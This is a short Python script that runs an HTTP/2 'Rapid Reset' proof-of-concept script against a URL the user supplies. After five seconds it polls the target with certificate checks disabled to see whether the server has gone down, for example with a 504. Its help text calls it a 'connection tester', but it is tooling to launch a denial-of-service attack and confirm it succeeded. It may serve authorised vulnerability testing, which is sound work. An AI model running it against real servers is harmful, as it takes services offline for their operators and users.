import subprocess
import time
import requests
import re
import argparse
from threading import Thread
from http import HTTPStatus
import signal
import sys


def strip_protocol(url):
    return re.sub(r"https?://(www\.)?", "", url).strip().strip("/")


def run_poc_script(url):
    return subprocess.Popen(
        ["python3", "http2_rapid_reset_poc.py", strip_protocol(url)]
    )


def monitor_http_responses(url):
    try:
        # Make a GET request to the URL
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url, verify=False)

        status_name = (
            HTTPStatus(response.status_code).phrase
            if response.status_code in HTTPStatus.__members__.values()
            else "Unknown Status"
        )

        if response.status_code == 504:
            print(f"Server status code: {response.status_code} ({status_name})")
        else:
            print(
                f"Server status code: {response.status_code} ({status_name})\nResponse Body: {response.content}"
            )

    except requests.RequestException as e:
        print(f"Error occurred: {e}")


def handle_interrupt(signum, frame):
    print("Interrupt received, terminating processes...")
    if poc_process:
        poc_process.terminate()
    sys.exit(0)


if __name__ == "__main__":
    # Set up argument parser
    parser = argparse.ArgumentParser(description="HTTP/2 connection tester")
    parser.add_argument("url", type=str, help="The URL to connect to")
    args = parser.parse_args()

    # Handle keyboard interrupt signal
    signal.signal(signal.SIGINT, handle_interrupt)
    signal.signal(signal.SIGTERM, handle_interrupt)

    poc_process = None
    try:
        # Start the http2_rapid_reset_poc.py script
        print("Executing Rapid Reset PoC...")
        poc_process = run_poc_script(args.url)
        time.sleep(5)

        # Start monitoring HTTP responses in a separate thread
        print("Requesting server status...")
        monitor_thread = Thread(target=monitor_http_responses, args=(args.url,))
        monitor_thread.start()

        # Wait for the monitor thread to finish
        monitor_thread.join()

    except KeyboardInterrupt:
        print("Manual interruption detected.")
        if poc_process:
            poc_process.terminate()
        sys.exit(0)

    finally:
        if poc_process:
            poc_process.terminate()
        print("Exiting...")
